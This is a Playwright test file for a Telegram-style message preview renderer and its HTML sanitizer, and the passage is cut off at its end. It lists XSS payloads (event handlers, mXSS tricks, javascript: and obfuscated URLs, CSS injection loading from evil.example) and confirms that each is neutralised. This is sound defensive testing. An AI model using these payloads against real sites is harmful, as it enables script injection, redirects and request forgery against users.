// Unit checks for the preview renderer and its HTML sanitizer (app/static/render.js).
// No studio needed: render.js is loaded into a blank page without CSP, so any handler
// that slips through the sanitizer really runs and flips window.__xss.
// Run: node tests/render_unit.mjs (CHROMIUM=/path/to/chromium to use a preinstalled browser)
/* global RichRender -- defined by render.js inside the page */
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';

const stat = (f) => fileURLToPath(new URL('../app/static/' + f, import.meta.url));
// what the real Telegram made of numeric entities (issue #174); tests/test_rich_limits.py checks the validator with it
const NUMERIC = JSON.parse(readFileSync(fileURLToPath(new URL('telegram_parse/numeric_entities.json', import.meta.url)), 'utf8'));
const results = [];
const check = (name, ok, info = '') => { results.push(ok); console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${ok || !info ? '' : '  ' + info}`); };

const browser = await chromium.launch(process.env.CHROMIUM ? { executablePath: process.env.CHROMIUM } : {});
const page = await browser.newPage();
const pageErrors = [];
page.on('pageerror', (e) => pageErrors.push(e.message));
page.on('dialog', (d) => { pageErrors.push('dialog: ' + d.message()); d.dismiss(); });
// tg.css gives the slideshow its layout, so scrolling and dragging it can be checked; KaTeX's styles lay a formula out
// as every page of the studio does, so where it puts its text can be checked too
await page.setContent('<!doctype html><meta charset="utf-8"><body><div id="out" class="tg-preview"></div></body>');
for (const f of ['vendor/katex/katex.min.css', 'tg.css']) await page.addStyleTag({ path: stat(f) });
for (const f of ['vendor/markdown-it.min.js', 'vendor/katex/katex.min.js', 'render.js']) await page.addScriptTag({ path: stat(f) });

// render a post into the live document, wait for image errors to fire, return the body's HTML
async function render(rich_message, extra = {}) {
  return page.evaluate(async ([rm, extra]) => {
    window.__xss = 0;
    const out = document.getElementById('out');
    out.replaceChildren(RichRender.render({ rich_message: rm, ...extra }, {}));
    await new Promise((r) => setTimeout(r, 150));
    return { html: out.querySelector('.tg-body').innerHTML, all: out.innerHTML, xss: window.__xss };
  }, [rich_message, extra]);
}
const has = (html, re) => re.test(html);

// ---------- dangerous markup is dropped or defused ----------
const PAYLOADS = {
  'script tag': '<p>a</p><script>window.__xss=1</script>',
  'img onerror': '<img src="x" onerror="window.__xss=1">',
  'svg onload': '<svg onload="window.__xss=1"><circle r="1"></circle></svg>',
  'math + mglyph': '<math><mtext><mglyph><style><img src=x onerror="window.__xss=1"></style></mglyph></mtext></math>',
  'iframe srcdoc': '<iframe srcdoc="<script>parent.__xss=1</script>"></iframe>',
  'object/embed': '<object data="x"></object><embed src="x">',
  'form + button': '<form action="https://evil"><button formaction="javascript:window.__xss=1">b</button></form>',
  'style tag': '<style>body{display:none}</style><p>t</p>',
  'meta refresh': '<meta http-equiv="refresh" content="0;url=https://evil">',
  'base href': '<base href="https://evil/">',
  'noscript mXSS': '<noscript><p title="</noscript><img src=x onerror=window.__xss=1>"></noscript>',
  'template': '<template><img src=x onerror="window.__xss=1"></template>',
  'details ontoggle': '<details open ontoggle="window.__xss=1"><summary>s</summary>x</details>',
  'video onerror': '<video src="x" onerror="window.__xss=1"></video>',
  'tg tag handler': '<tg-unknown onclick="window.__xss=1" onmouseover="window.__xss=1">x</tg-unknown>',
};
for (const [name, html] of Object.entries(PAYLOADS)) {
  const r = await render({ html });
  const bad = r.xss || has(r.html, /<(script|svg|math|iframe|object|embed|form|button|style|meta|base|template|noscript)\b|\son\w+=/i);
  check('drops ' + name, !bad, r.html);
}

// ---------- URLs ----------
const URLS = {
  'javascript:': 'javascript:window.__xss=1',
  'mixed case + spaces': '  JaVaScRiPt:window.__xss=1',
  'tab inside scheme': 'java\tscript:window.__xss=1',
  'entity-encoded scheme': 'javascript&#58;window.__xss=1',
  'vbscript:': 'vbscript:msgbox(1)',
  'data: html': 'data:text/html,<script>alert(1)</script>',
  'protocol-relative': '//evil.example/x',
  // in an http(s) address the browser reads «\» as «/» and takes tabs and line breaks out (issue #192)
  'protocol-relative with a backslash': '/\\evil.example/x',
  'two backslashes': '\\\\evil.example/x',
  'backslash and slash': '\\/evil.example/x',
  'slash, tab, backslash': '/\t\\evil.example/x',
  'slash, line break, slash': '/\n/evil.example/x',
  'backslash as an entity': '/&#92;evil.example/x',
  'space, then a backslash as a hex entity': ' /&#x5C;evil.example/x',
};
for (const [name, url] of Object.entries(URLS)) {
  const r = await render({ html: `<a href="${url.replace(/"/g, '&quot;')}">x</a><img src="${url.replace(/"/g, '&quot;')}">` });
  check('drops href/src ' + name, !has(r.html, /\s(href|src)=/i), r.html);
}
{
  const r = await render({ html: '<a href="https://ok.example/p">a</a><a href="mailto:a@b.c">m</a><a href="tg://resolve?domain=x">t</a><a href="#note">n</a><a href="#nowhere">w</a><footer><tg-reference name="note">1.</tg-reference></footer>' });
  // #name goes to a reference or anchor of that name; Telegram leaves any other #link as it is
  const ok = has(r.html, /href="https:\/\/ok\.example\/p" target="_blank" rel="noopener"/) && has(r.html, /href="mailto:a@b\.c"/) && has(r.html, /href="tg:\/\/resolve\?domain=x"/) && has(r.html, /href="#ref-note"/) && has(r.html, /href="#nowhere"/);
  check('keeps http(s), mailto, tg and #anchor links; external ones open in a new tab', ok, r.html);
}
{
  // Telegram drops a link whose address has a " in it (&quot; in HTML) and keeps its text; with &#x27; or %22 the
  // link stays (tests/telegram_parse/captured.json: html-href-quot, html-href-apos, html-href-pct22)
  const r = await render({ html: '<p>a <a href="https://example.com/?q=&quot;x&quot;">ссылка <b>ж</b></a> <a href=\'https://example.com/?q="x"\'>ещё</a> <a href="https://example.com/?q=&#x27;x&#x27;">два</a> <a href="https://example.com/?q=%22x%22">три</a></p>' });
  const ok = has(r.html, /^<p>a ссылка <b>ж<\/b> ещё <a href="https:\/\/example\.com\/\?q='x'"[^>]*>два<\/a> <a href="https:\/\/example\.com\/\?q=%22x%22"[^>]*>три<\/a><\/p>$/);
  check('a link with a " in its address is its text only, as Telegram makes it', ok, r.html);
}
{
  // Telegram decodes only &lt; &gt; &amp; &quot; and numeric entities with a small x: &quot without «;», &QUOT; and
  // &#X22; stay as typed, in text and in an address, so such a link is not dropped (measured, PR #173)
  const r = await render({ html: '<p>a &quot b &QUOT; c &#34; d &#x41; <a href="https://example.com/?q=&QUOT;x">раз</a> <a href="https://example.com/?q=&#X22;x">два</a></p>' });
  const ok = has(r.html, /^<p>a &amp;quot b &amp;QUOT; c " d A <a href="https:\/\/example\.com\/\?q=&amp;QUOT;x"[^>]*>раз<\/a> <a href="https:\/\/example\.com\/\?q=&amp;#X22;x"[^>]*>два<\/a><\/p>$/);
  check('only the entities Telegram knows are decoded in HTML', ok, r.html);
}
{
  // all 2125 names of HTML5 sent to Telegram (PR #173): it decodes exactly 16 of them, in html and markdown alike
  const src = '1&nbsp;2 3&mdash;4 5&laquo;6 7&#X22;8 &amp;&apos;&copy;&gt;&hellip;&ldquo;&lsquo;&lt;&ndash;&quot;&rdquo;&reg;&rsquo;&trade; &euro; &shy; &NBSP; &nbsp &#160;&#x2014;';
  const want = '1\u00a02 3—4 5&laquo;6 7&#X22;8 &\'©>…“‘<–"”®’™ &euro; &shy; &NBSP; &nbsp \u00a0—';
  const textOf = async (rm) => { await render(rm); return page.evaluate(() => document.querySelector('#out .tg-body p')?.textContent); };
  const html = await textOf({ html: '<p>' + src + '</p>' });
  check('html: the 16 named entities Telegram decodes and numeric ones are decoded, the rest stay as typed', html === want, JSON.stringify(html));
  const md = await textOf({ markdown: src });
  check('markdown: the same 16 and numeric ones, not every HTML5 name as markdown-it would', md === want, JSON.stringify(md));
  await render({ markdown: '[ссылка](https://example.com/?q=&quot;x&quot;&amp;y=&#34;)' });
  const href = await page.evaluate(() => document.querySelector('#out .tg-body a')?.getAttribute('href'));
  check('markdown: no entity is decoded in a link address, the link stays', href === 'https://example.com/?q=&quot;x&quot;&amp;y=&#34;', String(href));
}
{
  // numeric entities as Telegram makes them, not as the browser would (measured, issue #174): digits without a limit,
  // 0…31 a space (&#10; in <pre> a line break), 128…159 the same code point, not windows-1252
  const texts = (rm, sel) => page.evaluate(async ([rm, sel]) => {
    const out = document.getElementById('out');
    out.replaceChildren(RichRender.render({ rich_message: rm }, {}));
    return [...out.querySelectorAll('.tg-body ' + sel)].map((n) => n.textContent);
  }, [rm, sel]);
  const wrong = [];
  for (const [entity, made] of NUMERIC.text) {
    const [html] = await texts({ html: `<p>x${entity}y</p>` }, 'p');
    const [md] = await texts({ markdown: `x${entity}y` }, 'p');
    if (html !== `x${made}y` || md !== `x${made}y`) wrong.push(`${entity}: html ${JSON.stringify(html)}, markdown ${JSON.stringify(md)}`);
  }
  for (const [entity, made] of NUMERIC.pre) {
    const [pre] = await texts({ html: `<pre>x${entity}y</pre>` }, 'pre');
    const [code] = await texts({ html: `<pre><code>x${entity}y</code></pre>` }, 'pre');
    if (pre !== `x${made}y` || code !== `x${made}y`) wrong.push(`<pre>${entity}: ${JSON.stringify([pre, code])}`);
  }
  for (const [entity, made] of NUMERIC.inline_code) {
    const [code] = await texts({ html: `<p><code>x${entity}y</code></p>` }, 'code');
    if (code !== `x${made}y`) wrong.push(`<code>${entity}: ${JSON.stringify(code)}`);
  }
  check('numeric entities in html and markdown text, <pre> and <code> are what Telegram made of them', wrong.length === 0, wrong.join('; '));
  const fence = await texts({ markdown: '```\nx&#10;&#128;y\n```\n\nа `x&#128;y`' }, 'pre, code');
  check('markdown: in code entities stay as typed', JSON.stringify(fence) === JSON.stringify(['x&#10;&#128;y\n', 'x&#10;&#128;y\n', 'x&#128;y']), JSON.stringify(fence));
  const attr = await page.evaluate(() => {
    const a = RichRender.render({ rich_message: { html: '<p><a href="https://example.com/?a=&#128;&#0000000065;&#xD800;">ссылка</a></p>' } }, {}).querySelector('.tg-body a');
    return a && a.getAttribute('href');
  });
  check('an address decodes numbers the same way, one that erases text stays as typed there (not measured)', attr === 'https://example.com/?a=\u0080A&#xD800;', JSON.stringify(attr));
}
{
  // a surrogate or a number past U+10FFFF: Telegram erases the whole text it stands in, up to the nearest tag
  const wrong = [];
  for (const entity of NUMERIC.vanish) {
    for (const rm of [{ html: `<p>до</p><p>a ${entity} b</p>` }, { markdown: `до\n\na ${entity} b` }]) {
      const ps = await page.evaluate((rm) => [...RichRender.render({ rich_message: rm }, {}).querySelectorAll('.tg-body p')].map((p) => p.textContent), rm);
      if (JSON.stringify(ps) !== '["до",""]') wrong.push(`${JSON.stringify(rm)}: ${JSON.stringify(ps)}`);
    }
  }
  check('the text with a surrogate or a number past U+10FFFF is drawn empty, as Telegram makes it', wrong.length === 0, wrong.join('; '));
  const [html, md] = await page.evaluate(() => [RichRender.outline({ rich_message: { html: '<p>a <b>b&#1114112;</b> c</p>' } }), RichRender.outline({ rich_message: { markdown: 'a **b&#1114112;** c' } })]);
  check('only the text up to the nearest tag is erased', html === '<p>a <b></b> c</p>' && md === html, html + ' | ' + md);
}
{
  // a link address (measured, issue #174): over a " < > space, control character, U+0085, U+00A0, U+2003, U+3000 or
  // U+200B Telegram drops the link and keeps its text, in html and in blocks alike; U+2028 it takes out of the address
  const drops = ['"', '<', '>', ' ', '\t', '\n', '\u0000', '\u0001', '\u001f', '\u0085', '\u00a0', '\u2003', '\u3000', '\u200b'];
  const kept = ['\u007f', '\u0080', '\u00ad', '\ufeff', "'", '\\', '{|}'];
  const hrefs = (rm) => page.evaluate((rm) => [...RichRender.render({ rich_message: rm }, {}).querySelectorAll('.tg-body a')].map((a) => a.getAttribute('href')), rm);
  // in html as entities, the way it was measured: a NUL the browser itself would make U+FFFD
  // eslint-disable-next-line no-control-regex -- the control characters are the point
  const escape = (s) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/[\u0000-\u001f]/g, (c) => `&#${c.charCodeAt(0)};`);
  const wrong = [];
  for (const c of [...drops, ...kept]) {
    const url = `https://example.com/?q=${c}x`;
    for (const rm of [{ html: `<p>до <a href="${escape(url)}">ссылка</a></p>` }, { blocks: [{ type: 'paragraph', text: ['до ', { type: 'url', text: 'ссылка', url }] }] }]) {
      const got = await hrefs(rm);
      if (JSON.stringify(got) !== JSON.stringify(drops.includes(c) ? [] : [url])) wrong.push(`${JSON.stringify(c)} in ${Object.keys(rm)[0]}: ${JSON.stringify(got)}`);
    }
  }
  {
    const got = await hrefs({ blocks: [{ type: 'paragraph', text: { type: 'url', text: 'ссылка', url: 'https://example.com/?q=a\u2028b' } }] });
    if (JSON.stringify(got) !== '["https://example.com/?q=ab"]') wrong.push(`U+2028 in blocks: ${JSON.stringify(got)}`);
  }
  check('a link with a character Telegram drops it over is its text only; U+2028 is taken out of the address', wrong.length === 0, wrong.join('; '));
  // <a href> (measured, issue #195): a U+2028 typed as it is Telegram takes out, over one an entity makes it drops the
  // link. The table is telegram_parse/href_u2028.json, also read by tests/test_rich_limits.py for the check (tg_href)
  const HREF_U2028 = JSON.parse(readFileSync(fileURLToPath(new URL('telegram_parse/href_u2028.json', import.meta.url)), 'utf8')).cases;
  const u2028 = [];
  for (const [href, want] of HREF_U2028) {
    const html = `<p>до <a title="x\u2028y" href=${href}>ссылка</a> после</p>`;
    const [got, text] = await page.evaluate((html) => {
      const out = RichRender.render({ rich_message: { html } }, {});
      return [[...out.querySelectorAll('.tg-body a')].map((a) => a.getAttribute('href')), out.querySelector('.tg-body p')?.textContent];
    }, html);
    if (JSON.stringify(got) !== JSON.stringify(want === null ? [] : [want]) || text !== 'до ссылка после') u2028.push(`${href}: ${JSON.stringify(got)} ${text}`);
  }
  check('html: a typed U+2028 is taken out of an address, over one from an entity the link is its text only', u2028.length === 0, u2028.join('; '));
  const texts = await page.evaluate(() => RichRender.outline({ rich_message: { html: '<p>до <a href="https://example.com/? x">ссылка</a> после</p>' } }));
  check('the text of a dropped link stays', texts === '<p>до ссылка после</p>', texts);
  // U+2028 comes out of the address after the sanitizer looked at it: «/ /evil» is a path, «//evil» is another site
  const evil = await page.evaluate(() => ['<p><a href="/&#x2028;/evil.example/x">a</a></p>', '<p><a href="/\u2028/evil.example/x">b</a></p>']
    .flatMap((html) => [...RichRender.render({ rich_message: { html } }, {}).querySelectorAll('.tg-body a')].map((a) => a.getAttribute('href'))));
  check('taking U+2028 out of an address does not make a path a link to another site', evil.every((h) => h === null || !h.startsWith('//')), JSON.stringify(evil));
  // the url of a text element: «\» is «/» for the browser too (issue #192); what is left must stay on the studio
  const away = await page.evaluate(() => ['/\\evil.example/x', '\\\\evil.example/x', '\\/evil.example/x', '/\u2028\\evil.example/x', '/\\\u2028evil.example/x']
    .map((url) => RichRender.render({ rich_message: { blocks: [{ type: 'paragraph', text: { type: 'url', text: 'x', url } }] } }, {}).querySelector('.tg-body a')?.getAttribute('href') ?? null)
    .filter((h) => h !== null && new URL(h, 'https://studio.example/').host !== 'studio.example'));
  check('blocks: a url with «\\» for «/» is no link to another site', away.length === 0, JSON.stringify(away));
  // Telegram keeps U+FEFF in an address (measured, issue #174), at its end too: the preview does not trim it off
  const feff = await page.evaluate(() => [{ html: '<p><a href="https://example.com/x&#xFEFF;">a</a></p>' }, { blocks: [{ type: 'paragraph', text: { type: 'url', text: 'a', url: 'https://example.com/x\ufeff' } }] }]
    .map((rm) => RichRender.render({ rich_message: rm }, {}).querySelector('.tg-body a')?.getAttribute('href')));
  check('U+FEFF at the end of an address stays in it', feff.every((h) => h === 'https://example.com/x\ufeff'), JSON.stringify(feff));
  // the preview cuts html into tags and text for the entities: a «<a» without its «>» costs one look, not the rest
  const took = await page.evaluate(() => {
    const t = performance.now();
    RichRender.render({ rich_message: { html: '<p>x</p><p><a' + 'b'.repeat(100000) } }, {});
    return performance.now() - t;
  });
  check('a tag without its > is read in linear time', took < 500, took.toFixed(0) + ' ms');
  const sendable = await page.evaluate(() => RichRender.percentAddress('https://example.com/?q="a b"<\u00a0>\u2028\u200b\u0085'));
  check('percentAddress writes them %-encoded and takes U+2028 out', sendable === 'https://example.com/?q=%22a%20b%22%3C%C2%A0%3E%E2%80%8B%C2%85', sendable);
}
{
  const r = await render({ blocks: [{ type: 'paragraph', text: { type: 'url', text: 'клик', url: 'javascript:window.__xss=1' } }] });
  check('blocks: javascript: URL in a url entity has no href', !has(r.html, /href=/), r.html);
}
{
  // ton_address (Bot API 10.4): the reader sees the text as a link, the address goes only into the title
  const address = 'EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c" onclick="window.__xss=1';
  const r = await render({ blocks: [{ type: 'paragraph', text: ['TON ', { type: 'ton_address', text: 'EQAA…M9c', address }] }] });
  const clicked = await page.evaluate(async () => { document.querySelector('#out .tg-body .tg-link')?.click(); await new Promise((r) => setTimeout(r, 50)); return window.__xss; });
  const ok = has(r.html, /<p>TON <span class="tg-link tg-ton" title="Адрес TON: EQAA[^"]*">EQAA…M9c<\/span><\/p>/) && !has(r.html, /tg-unknown|\son\w+="/);
  check('blocks: ton_address is link-coloured text with the address in its title, no handler', ok && !r.xss && !clicked, r.html);
}
{
  // Telegram finds a TON address in HTML and Markdown text by itself: 48 characters with a right checksum, not a card
  // number with spaces (tests/telegram_parse/captured.json: html-detected-card-ton); not in code, links and formulas
  const eq = 'EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c';
  const uq = 'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJKZ';
  const found = async (rm) => { await render(rm); return page.evaluate(() => [...document.querySelectorAll('#out .tg-ton')].map((n) => n.textContent)); };
  const html = await found({ html: `<p>Карта 4242 4242 4242 4242, адрес TON ${eq} и <b>${uq}</b>.</p>` });
  check('html: TON addresses in text are link-coloured, a card number with spaces stays text', JSON.stringify(html) === JSON.stringify([eq, uq]), JSON.stringify(html));
  const md = await found({ markdown: `Адрес ${eq}, ещё **${uq}**` });
  check('markdown: TON addresses in text are found the same way', JSON.stringify(md) === JSON.stringify([eq, uq]), JSON.stringify(md));
  const not = await found({ html: `<p><code>${eq}</code> <a href="https://t.me/x">${eq}</a> <tg-math>${eq}</tg-math> x${eq} ${eq}x ${eq.slice(0, -1)} ${'A'.repeat(48)} 0:${'a'.repeat(64)}</p><pre>${uq}</pre>` });
  check('html: no TON address in code, links, formulas, glued to other letters, of another length or flags', not.length === 0, JSON.stringify(not));
  const off = await found({ html: `<p>${eq}</p>`, skip_entity_detection: true });
  check('html: skip_entity_detection leaves a TON address as text', off.length === 0, JSON.stringify(off));
  // in the strings of blocks too (measured: a plain «адрес EQAA…AM9c конец» comes back as ton_address), not in code
  const blocks = await found({ blocks: [{ type: 'paragraph', text: ['адрес ', eq, ' конец ', { type: 'code', text: uq }] }, { type: 'pre', text: uq }, { type: 'table', cells: [[{ text: uq }]] }] });
  check('blocks: a TON address in a plain string is found, not in code', JSON.stringify(blocks) === JSON.stringify([eq, uq]), JSON.stringify(blocks));
  const blocksOff = await found({ blocks: [{ type: 'paragraph', text: eq }], skip_entity_detection: true });
  check('blocks: skip_entity_detection leaves a TON address as text', blocksOff.length === 0, JSON.stringify(blocksOff));
  // only with a right checksum (measured: …AM9d and EQCD39…qB2X stay text); base64, base64url and a mix of both are
  // the same address (measured, issue #195)
  const b64 = 'EQAAW7YRbMcifdgzjulEn/pVsAtmwRx30i2I4z6Z9E+qBcnt';
  const b64url = 'EQAAW7YRbMcifdgzjulEn_pVsAtmwRx30i2I4z6Z9E-qBcnt';
  const mixed = 'EQAAW7YRbMcifdgzjulEn/pVsAtmwRx30i2I4z6Z9E-qBcnt';
  const sums = await found({ html: `<p>${eq.slice(0, -1)}d EQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqB2X EQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqB2N ${b64} ${b64url} ${mixed}</p>` });
  check('html: only addresses with a right checksum are found, in base64, base64url and a mix of both',
    JSON.stringify(sums) === JSON.stringify(['EQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqB2N', b64, b64url, mixed]), JSON.stringify(sums));
  // measured, issue #195 (each with a right checksum): flags 0x11 EQ…, 0x51 UQ…, 0x91 kQ… and 0xd1 0Q… are addresses,
  // 0x00 (48 «A») and 0x12 Eg… text; any workchain is: 1 EQE…, 2, 0x7f, 0x80 (−128) and 0xff (−1, Ef8…); a raw 0:hex
  // and an address in lower case are text
  const yes = [eq, uq, 'kQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHTW', '0QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACkT',
    'EQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEKA', 'EQIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMTF',
    'EX8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPYW', 'EYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAle',
    'Ef8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAU', 'Ef8AW7YRbMcifdgzjulEn_pVsAtmwRx30i2I4z6Z9E-qBTal', b64, b64url, mixed];
  const no = ['A'.repeat(48), 'EgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHsS', eq.slice(0, -1) + 'd', eq.toLowerCase(),
    `0:${'0'.repeat(64)}`, eq + 'A', 'EQ', null, 42];
  const table = await page.evaluate((list) => list.map((s) => RichRender.isTonAddress(s)), [...yes, ...no]);
  check('isTonAddress table', JSON.stringify(table) === JSON.stringify([...yes.map(() => true), ...no.map(() => false)]), JSON.stringify(table));
  const flags = await found({ html: `<p>${yes.join(' ')} ${no.slice(0, 5).join(' ')}</p>` });
  check('html: every address of the table is found in text, and nothing else', JSON.stringify(flags) === JSON.stringify(yes), JSON.stringify(flags));
  // neighbouring strings of RichText are one text for Telegram
  const split = await found({ blocks: [{ type: 'paragraph', text: ['адрес ', eq.slice(0, 20), eq.slice(20), ' конец'] }] });
  check('blocks: an address split between neighbouring strings is found', JSON.stringify(split) === JSON.stringify([eq]), JSON.stringify(split));
  // Telegram's own blocks went through its detection: drawn with the flag, an address it left as text stays text,
  // so the parse check and test:parity see a TON address the preview finds and Telegram does not
  const [answer, asHtml] = await page.evaluate(([eq]) => [RichRender.outline({ rich_message: { blocks: [{ type: 'paragraph', text: `адрес ${eq}` }], skip_entity_detection: true } }),
    RichRender.outline({ rich_message: { html: `<p>адрес ${eq}</p>` } })], [eq]);
  check('outline: Telegram\'s blocks drawn with skip_entity_detection differ from HTML where the preview finds the address', answer !== asHtml && !answer.includes('<ton>') && asHtml.includes('<ton>'), answer + ' | ' + asHtml);
  const [mine, theirs] = await page.evaluate(([eq]) => [RichRender.outline({ rich_message: { html: `<p>TON ${eq}</p>` } }),
    RichRender.outline({ rich_message: { blocks: [{ type: 'paragraph', text: ['TON ', { type: 'ton_address', text: eq, address: eq }] }] } })], [eq]);
  check('outline: a found TON address and a ton_address element read the same', mine === theirs && mine.includes('<ton>'), mine + ' | ' + theirs);
}
{
  const r = await render({ html: '<p>x</p>' }, { reply_markup: { inline_keyboard: [[{ text: 'b', url: 'javascript:window.__xss=1' }]] } });
  const clicked = await page.evaluate(async () => { document.querySelector('.tg-kb button, .tg-kb .tg-btn')?.click(); await new Promise((r) => setTimeout(r, 50)); return window.__xss; });
  check('keyboard: javascript: button URL does nothing on click', !clicked && !r.xss);
}
check('safeUrl table', await page.evaluate(() => {
  const s = RichRender.safeUrl;
  return s('https://a.b') && s('/media/x.png') && s('#a') && s('tg://user?id=1') && s('tel:+1')
    && s('//evil') === null && s('javascript:x') === null && s('') === null && s(null) === null && s('ftp://a') === null;
}));
// the check reads the address as the browser does and trims every space, so nothing in front hides a scheme or a «//»;
// what it gives back is the address as written (issue #192)
check('safeUrl: «\\» is «/», tabs and line breaks are out, spaces in front hide nothing', await page.evaluate(() => {
  const s = RichRender.safeUrl;
  return ['/\\evil', '\\\\evil', '\\/evil', '/\t\\evil', '/\n/evil', '/\r\n\\evil', ' //evil', '\ufeff//evil', ' /\\evil', '\ufeffjavascript:x', ' javascript:x', ' java\tscript:x']
    .every((u) => s(u) === null);
}));
// a #name the preview resolves itself, so it is read trimmed, as before #192: U+FEFF in front is still the anchor
check('safeUrl gives an address back as written, a #name trimmed', await page.evaluate(() => {
  const s = RichRender.safeUrl;
  return s('https://e.com/x\ufeff') === 'https://e.com/x\ufeff' && s('/media/a\ufeff.png') === '/media/a\ufeff.png' && s('\ufeff#a') === '#a';
}));
{
  // of the studio's own paths the preview loads only its files, /media/: <img src="/api/check?chat_id=@x"> was a GET
  // with the editor's cookies (issue #201). The path counts as the browser resolves it, on the studio's address too,
  // so this page stands on one: every request it makes is recorded
  const studio = await browser.newPage();
  const asked = [];
  await studio.route('**/*', (route) => {
    const u = new URL(route.request().url());
    asked.push(u.origin === 'https://studio.test' ? u.pathname + u.search : u.href);
    return route.fulfill(u.href === 'https://studio.test/' ? { contentType: 'text/html', body: '<!doctype html><meta charset="utf-8"><body><div id="out"></div></body>' } : { status: 404, body: '' });
  });
  await studio.goto('https://studio.test/');
  for (const f of ['vendor/markdown-it.min.js', 'render.js']) await studio.addScriptTag({ path: stat(f) });
  asked.length = 0;
  const loads = (rm) => studio.evaluate(async (rm) => {
    const out = /** @type {HTMLElement} */ (document.getElementById('out'));
    const found = [];
    for (const opts of [{}, { mediaBase: location.origin }]) { // as the editor and the MCP app draw it, and as /render does
      out.replaceChildren(RichRender.render({ rich_message: rm }, opts));
      out.querySelectorAll('[src], [poster]').forEach((n) => ['src', 'poster'].forEach((a) => n.hasAttribute(a) && found.push(a + '=' + n.getAttribute(a))));
      await new Promise((r) => setTimeout(r, 300));
    }
    return found;
  }, rm);
  const hostile = [
    { html: '<img src="/api/check?chat_id=@img"><video src="/api/check?chat_id=@video" poster="/api/check?chat_id=@poster"></video><audio src="/api/check?chat_id=@audio"></audio><video><source src="/api/check?chat_id=@source"></video>' },
    { markdown: '![](/api/check?chat_id=@md)\n\n<img src="/api/check?chat_id=@mdhtml">' },
    { html: '<img src="/media/../api/check?chat_id=@dots"><img src="/media/%2e%2e/api/check?chat_id=@pct"><img src="/media\\..\\api\\check?chat_id=@bs"><img src="https://studio.test/api/check?chat_id=@abs"><img src="#x"><img src="/static/tg.css">' },
    { blocks: [{ type: 'photo', photo: { type: 'photo', media: 'https://studio.test/api/check?chat_id=@block' } }] },
  ];
  const kept = [];
  for (const rm of hostile) kept.push(...await loads(rm));
  check('preview: of the studio\'s own paths src and poster keep only /media/; nothing else on it is requested', kept.length === 0 && asked.length === 0, JSON.stringify({ kept, asked }));
  const files = await loads({ html: '<img src="/media/a.png"><video src="/media/v.mp4" poster="/media/p.jpg"></video><img src="https://studio.test/media/b.png"><img src="https://other.example/c.png">' });
  const upload = await loads({ blocks: [{ type: 'photo', photo: { type: 'photo', media: 'upload:d.png' } }] });
  check('preview: files from /media/, uploads and other sites still load',
    JSON.stringify([...files.slice(0, 5), ...upload]) === JSON.stringify(['src=/media/a.png', 'src=/media/v.mp4', 'poster=/media/p.jpg', 'src=https://studio.test/media/b.png', 'src=https://other.example/c.png', 'src=/media/d.png', 'src=https://studio.test/media/d.png'])
    && asked.includes('/media/a.png') && asked.includes('https://other.example/c.png'), JSON.stringify({ files, upload, asked }));
  await studio.close();
}
{
  const r = await render({ html: '<p><a href="&#xFEFF;#note">n</a></p><footer><tg-reference name="note">1.</tg-reference></footer>' });
  check('U+FEFF before #name: still the link to the reference', has(r.html, /<a href="#ref-note" class="tg-reflink">n<\/a>/), r.html);
}
{
  // the scheme of a button is read off the address as the check reads it: a space in front does not take its click
  const opened = await page.evaluate(() => {
    const seen = [];
    const open = window.open;
    window.open = (u) => { seen.push(u); return null; };
    const html = '<tg-button-row><tg-button url=" https://example.com/x">b</tg-button><tg-button url=" javascript:window.__xss=1">c</tg-button></tg-button-row>';
    RichRender.render({ rich_message: { html } }, {}).querySelectorAll('.tg-btn').forEach((b) => b.click());
    window.open = open;
    return seen;
  });
  check('html: a button with a space before its https address opens it, a javascript: one does not', JSON.stringify(opened) === '["https://example.com/x"]', JSON.stringify(opened));
}

{
  // url="" is a url button, as the service and spec/chats.py read it, not a callback_data one (issue #197)
  const r = await render({ html: '<tg-button-row><tg-button url="">a</tg-button><tg-button>b</tg-button></tg-button-row>' });
  const titles = [...r.html.matchAll(/class="tg-btn[^"]*" title="([^"]*)"/g)].map((m) => m[1]);
  check('html: <tg-button url=""> is a url button, one without url is callback_data', titles.length === 2 && titles[0] === '' && titles[1] === 'callback: ', JSON.stringify(titles));
}

// ---------- attributes ----------
{
  const r = await render({ html: '<p style="position:fixed" class="evil" id="x" data-x="1" title="ok">t</p><span class="tg-spoiler">s</span>' });
  check('drops style, id, data-*, foreign classes; keeps title', !has(r.html, /style=|id="x"|data-x|class="evil"/) && has(r.html, /title="ok"/), r.html);
}
{
  // the alignment of a table cell from blocks is a value of text-align, not CSS (issue #201): written into the style
  // attribute, this cell covered the whole studio page over the shadow root and loaded a picture from evil.example
  const evil = 'left;position:fixed;inset:0;z-index:2147483647;background:#fff url(https://evil.example/opened.png)';
  await render({ blocks: [
    { type: 'table', cells: [[{ text: 'Сохранить', align: evil, valign: 'top;position:fixed;background:url(https://evil.example/v.png)' }, { text: 'b', align: 'right', valign: 'bottom', is_header: true }]] },
    // no coordinates: no tiles are fetched from openstreetmap.org
    { type: 'map', location: { latitude: 'north;position:fixed', longitude: 2 }, width: '1;position:fixed', height: '1;background:url(https://evil.example/m.png)' },
  ] });
  const got = await page.evaluate(() => ({
    styles: [...document.querySelectorAll('#out [style]')].map((n) => n.getAttribute('style')),
